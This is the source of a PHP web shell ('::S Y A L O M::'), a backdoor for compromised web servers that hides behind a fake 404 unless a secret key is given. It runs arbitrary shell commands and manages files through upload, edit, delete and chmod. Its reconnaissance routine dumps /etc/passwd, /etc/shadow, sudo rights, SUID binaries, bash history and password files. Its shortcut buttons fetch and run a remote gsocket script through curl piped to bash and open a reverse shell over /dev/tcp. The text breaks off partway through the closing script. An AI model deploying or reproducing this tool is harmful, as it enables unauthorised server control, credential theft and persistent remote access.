<?php
const AL_SHELL_KEY = 'al';

if (!isset($_GET['masuk']) || $_GET['masuk'] !== AL_SHELL_KEY) {
    if (isset($_GET['al']) && $_GET['al'] === 'here') {
        exit('welcome');
    }
    http_response_code(404);
    exit('404 Not Found');
}

if (isset($_GET['action']) && $_GET['action'] === 'perform_search') {
    header('Content-Type: text/html; charset=utf-8');
    $searchTerm = $_POST['search_term'] ?? '';
    $searchType = $_POST['search_type'] ?? 'filename';
    $searchFromRoot = isset($_POST['search_root']);

    if (empty($searchTerm)) {
        echo '<pre>Please enter a search term.</pre>';
        exit;
    }

    if ($searchFromRoot) {
        chdir('/');
    } else {
        chdir($dir);
    }

    $results = '';
    if ($searchType === 'filename') {
        $command = "find . -iname " . escapeshellarg("*$searchTerm*") . " 2>/dev/null";
        $results = shell_exec($command);
        if (empty(trim($results))) {
            $results = "No files or directories found matching '" . htmlspecialchars($searchTerm) . "'";
        }
    } elseif ($searchType === 'content') {
        $command = "grep -Rin " . escapeshellarg($searchTerm) . " . 2>/dev/null";
        $results = shell_exec($command);
        if (empty(trim($results))) {
            $results = "No files found containing the string '" . htmlspecialchars($searchTerm) . "'";
        }
    }
    
    echo "<pre>" . htmlspecialchars($results) . "</pre>";
    exit;
}

if (isset($_GET['action']) && $_GET['action'] === 'get_server_info') {
    header('Content-Type: text/html; charset=utf-8');
    echo get_detailed_server_info();
    exit;
}

if (isset($_POST['action']) && $_POST['action'] === 'navigate_to_dir' && !empty($_POST['target_dir'])) {
    $targetDir = $_POST['target_dir'];
    if (is_dir($targetDir)) {
        header("Location: ?masuk=" . AL_SHELL_KEY . "&d=" . urlencode($targetDir));
        exit;
    } else {
        $output = "Directory does not exist: " . htmlspecialchars($targetDir);
    }
}

header("X-Robots-Tag: noindex, nofollow", true);
header("Content-Type: text/html; charset=utf-8");

 $dir = $_GET['d'] ?? getcwd();
 $dir = rtrim($dir, '/\\');
 $output = '';
 $renameTarget = $_POST['rename_target'] ?? null;

 $server_info = php_uname('a');
 $software_info = $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown';
 $php_version = phpversion();
 $server_ip = $_SERVER['SERVER_ADDR'] ?? gethostbyname($_SERVER['SERVER_NAME']);

 $default_dir = getcwd();

function generate_breadcrumbs($path) {
    global $default_dir;
    $parts = explode(DIRECTORY_SEPARATOR, $path);
    $breadcrumbs = '<a href="?masuk=' . AL_SHELL_KEY . '&d=/">Root</a> / ';
    $current_path = '';
    foreach ($parts as $part) {
        if (empty($part)) continue;
        $current_path .= DIRECTORY_SEPARATOR . $part;
        $breadcrumbs .= '<a href="?masuk=' . AL_SHELL_KEY . '&d=' . urlencode($current_path) . '">' . htmlspecialchars($part) . '</a> / ';
    }
    
    $breadcrumbs .= '<a href="?masuk=' . AL_SHELL_KEY . '&d=' . urlencode($default_dir) . '" title="Return to default directory">[Default]</a>';
    
    return rtrim($breadcrumbs, ' / ');
}

function get_detailed_server_info() {
    $info = "";
    $info .= "<div class='info-group'><strong title='Shows detailed kernel and OS information.'>Kernel Info:</strong><pre>" . htmlspecialchars(shell_exec("uname -a && echo '[+] Dmesg (last 20 lines):' && dmesg | tail -n 20")) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Shows all configurable kernel variables.'>Sysctl Variables:</strong><pre>" . htmlspecialchars(shell_exec("sysctl -a 2>/dev/null | head -n 50")) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Current user identity and group ID.'>User & ID:</strong><pre>" . htmlspecialchars(shell_exec("whoami && id")) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Shows commands the current user can run with sudo.'>Sudo Rights:</strong><pre>" . htmlspecialchars(shell_exec("sudo -l 2>/dev/null || echo 'Sudo not accessible or no rights.'")) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='List of all users on the system.'>/etc/passwd:</strong><pre>" . htmlspecialchars(shell_exec("cat /etc/passwd")) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='List of all groups on the system.'>/etc/group:</strong><pre>" . htmlspecialchars(shell_exec("cat /etc/group")) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Attempts to read the password hash file (usually fails, but worth a try).'>/etc/shadow:</strong><pre>" . htmlspecialchars(shell_exec("cat /etc/shadow 2>/dev/null || echo 'Cannot read /etc/shadow.'")) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Network interface configuration and IP addresses.'>Network Interfaces:</strong><pre>" . htmlspecialchars(shell_exec("ip a")) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Shows active TCP/UDP connections and open ports.'>Active Connections:</strong><pre>" . htmlspecialchars(shell_exec("ss -tulpn")) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='ARP table to see IP to MAC address mapping.'>ARP Table:</strong><pre>" . htmlspecialchars(shell_exec("arp -a")) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Kernel routing table.'>Routing Table:</strong><pre>" . htmlspecialchars(shell_exec("route -n")) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Shows all running processes.'>Running Processes:</strong><pre>" . htmlspecialchars(shell_exec("ps aux")) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Shows a snapshot of CPU and memory usage.'>Top Snapshot:</strong><pre>" . htmlspecialchars(shell_exec("top -bn1")) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Shows running services (if using systemd).'>Running Services (systemd):</strong><pre>" . htmlspecialchars(shell_exec("systemctl list-units --type=service --state=running --no-pager 2>/dev/null || echo 'systemctl not found.'")) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='View current user\'s crontab.'>User Crontab:</strong><pre>" . htmlspecialchars(shell_exec("crontab -l 2>/dev/null || echo 'No crontab for this user.'")) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Finds all cron files on the system.'>System Crons:</strong><pre>" . htmlspecialchars(shell_exec("ls -la /etc/cron* 2>/dev/null")) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Disk usage on all filesystems.'>Disk Usage:</strong><pre>" . htmlspecialchars(shell_exec("df -h")) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Shows all mounted filesystems.'>Mounted Filesystems:</strong><pre>" . htmlspecialchars(shell_exec("mount")) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Finds files with SUID bit. If exploited, can give root access.'>SUID Files:</strong><pre>" . htmlspecialchars(shell_exec("find / -perm -4000 -type f 2>/dev/null")) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Finds files with SGID bit.'>SGID Files:</strong><pre>" . htmlspecialchars(shell_exec("find / -perm -2000 -type f 2>/dev/null")) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Finds files writable by anyone.'>World-Writable Files:</strong><pre>" . htmlspecialchars(shell_exec("find / -writable -type f -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null | head -n 20")) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='PHP version and configuration.'>PHP Config:</strong><pre>Disable Functions: " . htmlspecialchars(ini_get('disable_functions')) . "\nPHP INI Path: " . htmlspecialchars(php_ini_loaded_file()) . "\n" . htmlspecialchars(shell_exec("php -i | grep 'Configuration File'")) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Searches for common software versions on the server.'>Software Versions:</strong><pre>" . htmlspecialchars(shell_exec("python --version 2>&1 && python3 --version 2>&1 && perl -v | head -n 2 && ruby -v 2>&1 && gcc --version | head -n 1 && nginx -v 2>&1 && apache2 -v 2>&1 || httpd -v 2>&1")) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Lists other users\' home directories.'>/home Directories:</strong><pre>" . htmlspecialchars(shell_exec("ls -la /home/ 2>/dev/null")) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Attempts to list the root directory.'>/root Directory:</strong><pre>" . htmlspecialchars(shell_exec("ls -la /root/ 2>/dev/null || echo 'Cannot access /root.'")) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Views SSH configuration.'>SSH Config:</strong><pre>" . htmlspecialchars(shell_exec("ls -la /etc/ssh/ 2>/dev/null && cat /etc/ssh/sshd_config 2>/dev/null")) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Searches for interesting configuration files.'>Config Files:</strong><pre>" . htmlspecialchars(shell_exec("find / -type f -name '*.conf' 2>/dev/null | head -n 20")) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Searches for files containing keywords like password.'>Password Files:</strong><pre>" . htmlspecialchars(shell_exec("find / -type f -name '*.pwd' -o -name '*password*' 2>/dev/null | head -n 20")) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Views user shell command history.'>History Files:</strong><pre>" . htmlspecialchars(shell_exec("cat ~/.bash_history 2>/dev/null && echo '---' && cat ~/.nano_history 2>/dev/null")) . "</pre></div>";
    
    return $info;
}

if (isset($_POST['action']) && $_POST['action'] === 'chmod') {
    $targetFile = $dir . DIRECTORY_SEPARATOR . basename($_POST['chmod_target']);
    $permission = $_POST['chmod_perm'];
    $recursive = isset($_POST['chmod_recursive']) ? '-R' : '';

    if (is_dir($targetFile) && empty($recursive)) {
        $command = "chmod " . escapeshellarg($permission) . " " . escapeshellarg($targetFile);
    } else {
        $command = "chmod " . $recursive . " " . escapeshellarg($permission) . " " . escapeshellarg($targetFile);
    }
    
    shell_exec($command . " 2>&1");
    header("Location: ?masuk=" . AL_SHELL_KEY . "&d=" . urlencode($dir));
    exit;
}

if (isset($_POST['action']) && $_POST['action'] === 'zip_selected' && !empty($_POST['selected_files'])) {
    $zipName = 'archive_' . date('Y-m-d_H-i-s') . '.zip';
    $zip = new ZipArchive();
    if ($zip->open($dir . DIRECTORY_SEPARATOR . $zipName, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
        foreach ($_POST['selected_files'] as $file) {
            $filePath = $dir . DIRECTORY_SEPARATOR . basename($file);
            if (is_file($filePath)) {
                $zip->addFile($filePath, basename($filePath));
            } elseif (is_dir($filePath)) {
                $zip->addEmptyDir(basename($filePath));
                $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($filePath), RecursiveIteratorIterator::SELF_FIRST);
                foreach ($iterator as $fileInfo) {
                    if ($fileInfo->isDot()) continue;
                    $localPath = basename($filePath) . '/' . $iterator->getSubPathName();
                    if ($fileInfo->isDir()) {
                        $zip->addEmptyDir($localPath);
                    } else {
                        $zip->addFile($fileInfo->getRealPath(), $localPath);
                    }
                }
            }
        }
        $zip->close();
    }
    header("Location: ?masuk=" . AL_SHELL_KEY . "&d=" . urlencode($dir));
    exit;
}

if (isset($_POST['action']) && $_POST['action'] === 'delete_selected' && !empty($_POST['selected_files'])) {
    foreach ($_POST['selected_files'] as $file) {
        $targetPath = $dir . DIRECTORY_SEPARATOR . basename($file);
        if (is_dir($targetPath)) {
            @rmdir_recursive($targetPath);
        } else {
            @unlink($targetPath);
        }
    }
    header("Location: ?masuk=" . AL_SHELL_KEY . "&d=" . urlencode($dir));
    exit;
}

if (isset($_POST['action']) && $_POST['action'] === 'unzip_file' && !empty($_POST['unzip_target'])) {
    $targetFile = $dir . DIRECTORY_SEPARATOR . basename($_POST['unzip_target']);
    $zip = new ZipArchive;
    if ($zip->open($targetFile) === TRUE) {
        $zip->extractTo($dir);
        $zip->close();
    }
    header("Location: ?masuk=" . AL_SHELL_KEY . "&d=" . urlencode($dir));
    exit;
}

if (isset($_GET['action']) && $_GET['action'] === 'view_file') {
    $file = basename($_GET['file']);
    $filepath = $dir . DIRECTORY_SEPARATOR . $file;
    if (is_file($filepath)) {
        $raw = @file_get_contents($filepath);
        header('Content-Type: application/json');
        if (mb_check_encoding($raw, 'UTF-8')) {
            echo json_encode(['content' => $raw]);
        } else {
            echo json_encode(['content' => '[File is binary or not UTF-8 compatible]']);
        }
    } else {
        http_response_code(404);
        echo json_encode(['content' => 'File not found.']);
    }
    exit;
}

if (!empty($_POST['cmd'])) {
    chdir($dir);
    $output = shell_exec($_POST['cmd'] . " 2>&1");
}

if (isset($_POST['new_name']) && $renameTarget) {
    $oldPath = $dir . DIRECTORY_SEPARATOR . $renameTarget;
    $newPath = $dir . DIRECTORY_SEPARATOR . basename($_POST['new_name']);
    if (@rename($oldPath, $newPath)) {
        header("Location: ?masuk=" . AL_SHELL_KEY . "&d=" . urlencode($dir));
        exit;
    } else {
        $output = "Failed to rename $renameTarget.";
    }
}

if (isset($_POST['save_edit']) && isset($_POST['edit_file']) && isset($_POST['file_content'])) {
    $targetFile = $dir . DIRECTORY_SEPARATOR . $_POST['edit_file'];
    file_put_contents($targetFile, $_POST['file_content']);
    header("Location: ?masuk=" . AL_SHELL_KEY . "&d=" . urlencode($dir));
    exit;
}

if (isset($_FILES['upload_file'])) {
    $target = $dir . DIRECTORY_SEPARATOR . basename($_FILES['upload_file']['name']);
    $output = move_uploaded_file($_FILES['upload_file']['tmp_name'], $target) ? "Upload successful." : "Upload failed.";
}

if (isset($_POST['create_type'], $_POST['create_name'])) {
    $newPath = $dir . DIRECTORY_SEPARATOR . basename($_POST['create_name']);
    if ($_POST['create_type'] === 'file') {
        file_put_contents($newPath, '');
        $output = "File created.";
    } elseif ($_POST['create_type'] === 'dir') {
        mkdir($newPath);
        $output = "Directory created.";
    }
}

if (isset($_GET['download'])) {
    $file = basename($_GET['download']);
    $filepath = $dir . DIRECTORY_SEPARATOR . $file;
    if (is_file($filepath)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename=' . basename($filepath));
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($filepath));
        readfile($filepath);
        exit;
    }
}

if (isset($_POST['delete_target'])) {
    $target = $dir . DIRECTORY_SEPARATOR . $_POST['delete_target'];
    if (is_dir($target)) {
        $files = array_diff(scandir($target), ['.', '..']);
        foreach ($files as $file) {
            (is_dir("$target/$file")) ? rmdir_recursive("$target/$file") : unlink("$target/$file");
        }
        rmdir($target);
    } else {
        unlink($target);
    }
    header("Location: ?masuk=" . AL_SHELL_KEY . "&d=" . urlencode($dir));
    exit;
}

function rmdir_recursive($dir) {
    $files = array_diff(scandir($dir), ['.', '..']);
    foreach ($files as $file) {
        (is_dir("$dir/$file")) ? rmdir_recursive("$dir/$file") : unlink("$dir/$file");
    }
    return rmdir($dir);
}

function list_dir($path) {
    $files = @scandir($path);
    if (!$files) return '<div class="error">Cannot open directory</div>';
    
    $html = "<div class='file-actions'><button id='zipSelectedBtn' disabled>Zip Selected</button> <button id='deleteSelectedBtn' disabled style='background: #d32f2f; color: white;'>Delete Selected</button></div>";
    $html .= "<table class='file-table'><thead><tr>";
    $html .= "<th><input type='checkbox' id='selectAll'></th>";
    $html .= "<th></th>";
    $html .= "<th onclick='sortTable(1)'>Name ↕</th>";
    $html .= "<th onclick='sortTable(2)'>Permissions ↕</th>";
    $html .= "<th onclick='sortTable(3)'>Size ↕</th>";
    $html .= "<th onclick='sortTable(4)'>Modified ↕</th>";
    $html .= "<th>Actions</th>";
    $html .= "</tr></thead><tbody>";

    if (realpath($path) !== '/') {
        $parent = dirname($path);
        $html .= "<tr><td></td><td></td><td colspan='5'><a href='?masuk=" . AL_SHELL_KEY . "&d=" . urlencode($parent) . "'>[..]</a></td></tr>";
    }
    
    foreach ($files as $f) {
        if ($f === "." || $f === "..") continue;
        $full = $path . DIRECTORY_SEPARATOR . $f;
        $encoded = htmlspecialchars($f, ENT_QUOTES);
        $urlBase = "?masuk=" . AL_SHELL_KEY . "&d=" . urlencode($path);
        
        $isDir = is_dir($full);
        $icon = $isDir ? "[📁]" : "[📄]";
        $nameLink = $isDir ? "<a class='dir-link' href='$urlBase&d=" . urlencode($full) . "'>$encoded</a>" : "<a class='file-link' href='$urlBase&d=" . urlencode($full) . "'>$encoded</a>";
        
        $perms = substr(sprintf('%o', fileperms($full)), -4);
        $modTime = date('d-m-Y H:i:s', filemtime($full));
        $isZip = !$isDir && pathinfo($f, PATHINFO_EXTENSION) === 'zip';

        if ($isDir) {
            $size = '—';
        } else {
            $sizeInBytes = filesize($full);
            $size = number_format($sizeInBytes / 1048576, 2) . ' MB';
        }

        $isWritable = is_writable($full);
        $writableClass = $isWritable ? '' : 'not-writable';
        
        $checkbox = "<input type='checkbox' class='file-select' value='" . htmlspecialchars($f, ENT_QUOTES) . "'>";

        $actions = "<a class='action-link' href='javascript:void(0)' onclick='viewFileAsync(\"" . htmlspecialchars($f, ENT_QUOTES) . "\")'>[V]</a> 
                   <a class='action-link' href='javascript:void(0)' onclick='openEditModal(\"" . htmlspecialchars($f, ENT_QUOTES) . "\")'>[E]</a> 
                   <a class='action-link' href='javascript:void(0)' onclick='openRenameModal(\"" . htmlspecialchars($f, ENT_QUOTES) . "\")'>[R]</a>
                   <a class='action-link' href='javascript:void(0)' onclick='openChmodModal(\"" . htmlspecialchars($f, ENT_QUOTES) . "\")'>[Chmod]</a>
                   <a class='action-link' href='javascript:void(0)' onclick='openDeleteModal(\"" . htmlspecialchars($f, ENT_QUOTES) . "\")'>[Del]</a> 
                   <a class='action-link' href='$urlBase&download=" . urlencode($f) . "' target='_blank'>[DL]</a>";
        if ($isZip) {
            $actions .= " <a class='action-link' href='javascript:void(0)' onclick='unzipFile(\"" . htmlspecialchars($f, ENT_QUOTES) . "\")'>[U]</a>";
        }

        $html .= "<tr data-filename='" . htmlspecialchars($f, ENT_QUOTES) . "'>";
        $html .= "<td>$checkbox</td>";
        $html .= "<td class='$writableClass'>$icon</td>";
        $html .= "<td>$nameLink</td>";
        $html .= "<td>$perms</td>";
        $html .= "<td>$size</td>";
        $html .= "<td>$modTime</td>";
        $html .= "<td>$actions</td>";
        $html .= "</tr>";
    }
    $html .= "</tbody></table>";
    return $html;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>::S Y A L O M::</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: 'Courier New', Courier, monospace; background: #111; color: #0f0; margin: 0; padding: 10px; }
        .container { display: flex; max-width: 1600px; margin: auto; gap: 20px; }
        .menu-panel { width: 30%; min-width: 300px; }
        .file-panel { width: 70%; }
        h1, h2, h3 { color: #0f0; border-bottom: 1px solid #0f0; padding-bottom: 5px; }
        input, textarea, select { width: 100%; margin-bottom: 10px; background: #222; color: #0f0; border: 1px solid #0f0; padding: 8px; box-sizing: border-box; }
        input[type="checkbox"], input[type="radio"] { width: auto; vertical-align: middle; margin-right: 8px; }
        button { padding: 8px 12px; background: #0f0; color: #111; border: none; cursor: pointer; font-weight: bold; margin-right: 5px;}
        button:disabled { background: #444; color: #666; cursor: not-allowed; }
        .output { white-space: pre-wrap; background: #000; padding: 10px; border: 1px solid #0f0; margin-top: 10px; word-wrap: break-word; }
        .section { margin-bottom: 20px; border: 1px solid #0f0; padding: 15px; max-height: 400px; overflow-y: auto; }
        .section pre { font-size: 11px; line-height: 1.3; }
        .info-group { margin-bottom: 15px; }
        .info-group strong { color: #6cf; cursor: help; }
        .action-link { color: #fff; }
        a { color: #f0f; text-decoration: none; }
        .file-link { color: #0f0; }
        .dir-link { color: #f0f; }
        #server-info { background: #000; border: 1px solid #0f0; padding: 10px; margin-bottom: 10px; white-space: pre-wrap; }
        #breadcrumbs { background: #1a1a1a; padding: 10px; margin-bottom: 10px; border: 1px solid #0f0; }
        #breadcrumbs a { color: #6cf; text-decoration: none; }
        #breadcrumbs a:hover { text-decoration: underline; }
        .modal { display: none; position: fixed; z-index: 10; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.8); justify-content: center; align-items: center; }
        .modal-content { background: #222; color: #0f0; padding: 20px; border: 2px solid #0f0; width: 90%; max-width: 700px; max-height: 80vh; overflow-y: auto; position: relative; }
        .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
        .modal-header h3 { margin: 0; border: none; }
        .modal-body { max-height: 60vh; overflow-y: auto; }
        .modal-footer { margin-top: 15px; text-align: right; }
        #viewContent, #shellOutput, #serverInfoContent, #searchResultsContent { background: #111; padding: 10px; border: 1px solid #0f0; max-height: 400px; overflow: auto; white-space: pre-wrap; word-wrap: break-word; }
        .modal textarea { width: 100%; height: 300px; }
        .modal.active { display: flex; }
        .shell-shortcuts { margin-top: 10px; }
        .shell-shortcuts span { cursor: pointer; color: #f0f; font-size: 11px; display: inline-block; margin: 2px 4px; padding: 2px 4px; border: 1px solid #333; border-radius: 3px; }
        .shell-shortcuts span:hover { background-color: #333; }
        .file-actions { margin-bottom: 10px; }
        .file-table { width: 100%; border-collapse: collapse; }
        .file-table th, .file-table td { border: 1px solid #0f0; padding: 8px; text-align: left; }
        .file-table th { background-color: #222; cursor: pointer; user-select: none; }
        .file-table th:hover { background-color: #333; }
        .file-table tbody tr:nth-child(even) { background-color: #1a1a1a; }
        .file-table tbody tr:hover { background-color: #2a2a2a; }
        .not-writable { color: red; }
        .chmod-options { display: flex; align-items: center; gap: 15px; margin-bottom: 10px; }
        .chmod-options label { white-space: nowrap; }
        .navigation-container { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
        .navigation-form { display: flex; gap: 10px; }
        .navigation-form input { width: 300px; }
        .navigation-form button { white-space: nowrap; }
        .default-dir-btn { background: #6cf; color: #111; }
    </style>
</head>
<body>

<div class="container">
    <div class="menu-panel">
        <h1>::S Y A L O M::</h1>
        
        <div class="section">
            <h3>🔍 Search</h3>
            <form id="searchForm">
                <input type="text" name="search_term" id="searchTermInput" placeholder="Enter search term...">
                <div style="margin-bottom: 10px;">
                    <label><input type="radio" name="search_type" value="filename" checked> By Filename</label>
                    <label><input type="radio" name="search_type" value="content"> By Content</label>
                </div>
                <div style="margin-bottom: 10px;">
                    <label><input type="checkbox" name="search_root" id="searchRootCheckbox"> Search from root (/)</label>
                </div>
                <button type="submit">Search</button>
            </form>
        </div>
        
        <div class="section">
            <h3><a href="javascript:void(0)" onclick="loadAndShowServerInfo()">🖥️ Server Information</a></h3>
        </div>

        <div class="section">
            <h3><a href="javascript:void(0)" onclick="openModal('shellModal')">💻 Shell Command</a></h3>
        </div>

        <div class="section">
            <h3>📤 Upload File</h3>
            <form method="post" enctype="multipart/form-data">
                <input type="file" name="upload_file">
                <button type="submit">Upload</button>
            </form>
        </div>
        
        <div class="section">
            <h3>➕ Create File/Folder</h3>
            <form method="post">
                <input type="text" name="create_name" placeholder="File or folder name">
                <select name="create_type">
                    <option value="file">File</option>
                    <option value="dir">Directory</option>
                </select>
                <button type="submit">Create</button>
            </form>
        </div>
    </div>

    <div class="file-panel">
        <div id="server-info"><strong>Server Info:</strong><br><?= htmlspecialchars($server_info) ?><br><strong>SOFT:</strong> <?= htmlspecialchars($software_info) ?> <strong>PHP:</strong> <?= htmlspecialchars($php_version) ?><br><strong>Path:</strong> <?= htmlspecialchars($dir) ?><br><strong>IP:</strong> <?= htmlspecialchars($server_ip) ?></div>
        
        <div class="navigation-container">
            <div id="breadcrumbs"><?= generate_breadcrumbs($dir) ?></div>
            <div class="navigation-form">
                <form method="post" id="navigateForm" style="display: flex; gap: 10px;">
                    <input type="hidden" name="action" value="navigate_to_dir">
                    <input type="text" name="target_dir" id="targetDirInput" placeholder="/path/to/directory" value="<?= htmlspecialchars($dir) ?>">
                    <button type="submit">Go</button>
                </form>
                <button class="default-dir-btn" onclick="goToDefaultDirectory()">Default</button>
            </div>
        </div>
        
        <?= list_dir($dir) ?>
    </div>
</div>

<div class="output" style="display:none;"><?= htmlspecialchars($output) ?></div>

<div class="modal" id="viewModal">
    <div class="modal-content">
        <div class="modal-header">
            <h3 id="viewTitle"></h3>
            <button onclick="copyToClipboard('viewContent')">Copy</button>
        </div>
        <div class="modal-body">
            <pre id="viewContent">Loading...</pre>
        </div>
        <div class="modal-footer">
            <button onclick="closeModal('viewModal')">Close</button>
        </div>
    </div>
</div>

<div class="modal" id="editModal">
    <div class="modal-content">
        <div class="modal-header">
            <h3 id="editTitle"></h3>
        </div>
        <form method="post">
            <input type="hidden" name="edit_file" id="editFile">
            <textarea name="file_content" id="editContent"></textarea>
            <div class="modal-footer">
                <button type="submit" name="save_edit">Save</button>
                <button type="button" onclick="closeModal('editModal')">Cancel</button>
            </div>
        </form>
    </div>
</div>

<div class="modal" id="renameModal">
    <div class="modal-content">
        <div class="modal-header">
            <h3 id="renameTitle"></h3>
        </div>
        <form method="post">
            <input type="hidden" name="rename_target" id="renameTarget">
            <input type="text" name="new_name" placeholder="New name">
            <div class="modal-footer">
                <button type="submit">Rename</button>
                <button type="button" onclick="closeModal('renameModal')">Cancel</button>
            </div>
        </form>
    </div>
</div>

<div class="modal" id="chmodModal">
    <div class="modal-content">
        <div class="modal-header">
            <h3 id="chmodTitle"></h3>
        </div>
        <form id="chmodForm" method="post">
            <input type="hidden" name="action" value="chmod">
            <input type="hidden" name="chmod_target" id="chmodTarget">
            
            <div class="chmod-options">
                <label for="chmodPermSelect">Permissions:</label>
                <select name="chmod_perm" id="chmodPermSelect">
                    <option value="755">755 (rwxr-xr-x)</option>
                    <option value="644">644 (rw-r--r--)</option>
                    <option value="777">777 (rwxrwxrwx)</option>
                    <option value="600">600 (rw-------)</option>
                    <option value="750">750 (rwxr-x---)</option>
                    <option value="custom">Custom...</option>
                </select>
            </div>

            <div id="customPermDiv" style="display:none; margin-bottom: 10px;">
                <label for="customPermInput">Custom Value (e.g., 755 or u+rwx):</label>
                <input type="text" name="custom_perm" id="customPermInput" placeholder="755">
            </div>

            <div class="chmod-options">
                <input type="checkbox" name="chmod_recursive" id="chmodRecursive">
                <label for="chmodRecursive">Recursive (apply to contents of directory)</label>
            </div>

            <div class="modal-footer">
                <button type="submit">Apply</button>
                <button type="button" onclick="closeModal('chmodModal')">Cancel</button>
            </div>
        </form>
    </div>
</div>

<div class="modal" id="confirmDeleteModal">
    <div class="modal-content">
        <div class="modal-header">
            <h3>Confirm Delete</h3>
        </div>
        <p id="deleteMessage"></p>
        <form method="post">
            <input type="hidden" name="delete_target" id="deleteTarget">
            <div class="modal-footer">
                <button type="submit">Delete</button>
                <button type="button" onclick="closeModal('confirmDeleteModal')">Cancel</button>
            </div>
        </form>
    </div>
</div>

<div class="modal" id="serverInfoModal">
    <div class="modal-content">
        <div class="modal-header">
            <h3>Detailed Server Information</h3>
            <button onclick="copyToClipboard('serverInfoContent')">Copy</button>
        </div>
        <div class="modal-body">
            <div id="serverInfoContent">Server information will be loaded here...</div>
        </div>
        <div class="modal-footer">
            <button onclick="closeModal('serverInfoModal')">Close</button>
        </div>
    </div>
</div>

<div class="modal" id="shellModal">
    <div class="modal-content">
        <div class="modal-header">
            <h3>Shell Command</h3>
        </div>
        <form id="shellForm">
            <input type="text" name="cmd" id="shellCmdInput" placeholder="Type shell command">
            <button type="submit">Execute</button>
        </form>
        <div class="shell-shortcuts">
            <strong>Shortcuts:</strong><br>
            <span onclick="setShellCommand('pwd')">pwd</span>
            <span onclick="setShellCommand('ls -la')">ls -la</span>
            <span onclick="setShellCommand('whoami && id')">whoami && id</span>
            <span onclick="setShellCommand('uname -a')">uname -a</span>
            <span onclick="setShellCommand('cat /etc/passwd')">cat /etc/passwd</span>
            <span onclick="setShellCommand('ps aux')">ps aux</span>
            <span onclick="setShellCommand('netstat -tulnp')">netstat -tulnp</span>
            <span onclick="setShellCommand('find / -perm -4000 -type f 2>/dev/null')">find SUID</span>
            <span onclick="setShellCommand('find / -writable -type f 2>/dev/null | head -n 20')">find writable</span>
            <span onclick="setShellCommand('ls -la /root')">ls -la /root</span>
            <span onclick="setShellCommand('crontab -l')">crontab -l</span>
            <span onclick="setShellCommand('cat ~/.bash_history')">cat bash_history</span>

            <hr>

            <span onclick="setShellCommand('GS_UNDO=1 bash -c &quot;$(curl -fsSL https://gsocket.io/y)&quot;')">Undo Gsocket</span>
            <span onclick="setShellCommand('bash -c &quot;$(curl -fsSL https://gsocket.io/y)&quot;')">Install Gsocket</span>

            <hr>

            <span onclick="setShellCommand('bash -i >&amp; /dev/tcp/__IP__/443 0>&amp;1')">
                Connect Reverse Shell
            </span>
        </div>
        <div class="modal-body">
            <pre id="shellOutput">Output will appear here...</pre>
        </div>
        <div class="modal-footer">
            <button onclick="copyToClipboard('shellOutput')">Copy Output</button>
            <button onclick="closeModal('shellModal')">Close</button>
        </div>
    </div>
</div>

<div class="modal" id="searchResultsModal">
    <div class="modal-content">
        <div class="modal-header">
            <h3>Search Results</h3>
            <button onclick="copyToClipboard('searchResultsContent')">Copy</button>
        </div>
        <div class="modal-body">
            <div id="searchResultsContent">Results will appear here...</div>
        </div>
        <div class="modal-footer">
            <button onclick="closeModal('searchResultsModal')">Close</button>
        </div>
    </div>
</div>

<script>
document.addEventListener('keydown', function(e) { if (e.key === 'Escape') { document.querySelectorAll('.modal').forEach(modal => modal.classList.remove('active')); } });

function openModal(id) { document.getElementById(id).classList.add('active'); }
function closeModal(id) { document.getElementById(id).classList.remove('active'); }

function copyToClipboard(elementId) {
    const textToCopy = document.getElementById(elementId).innerText;
    navigator.clipboard.writeText(textToCopy).then(() => {
        alert('Copied to clipboard!');
    }).catch(err => {
        console.error('Failed to copy text: ', err);
    });
}

function setShellCommand(cmd) {
    document.getElementById('shellCmdInput').value = cmd;
}

function loadAndShowServerInfo() {
    const modal = document.getElementById('serverInfoModal');
    const contentDiv = document.getElementById('serverInfoContent');

    openModal('serverInfoModal');
    contentDiv.innerHTML = 'Loading server information, please wait...';

    const url = '?masuk=<?= AL_SHELL_KEY ?>&action=get_server_info';

    fetch(url)
        .then(response => {
            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            return response.text();
        })
        .then(html => {
            contentDiv.innerHTML = html;
        })
        .catch(error => {
            contentDiv.innerHTML = 'Failed to load server information: ' + error.message;
        });
}

function viewFileAsync(fileName) {
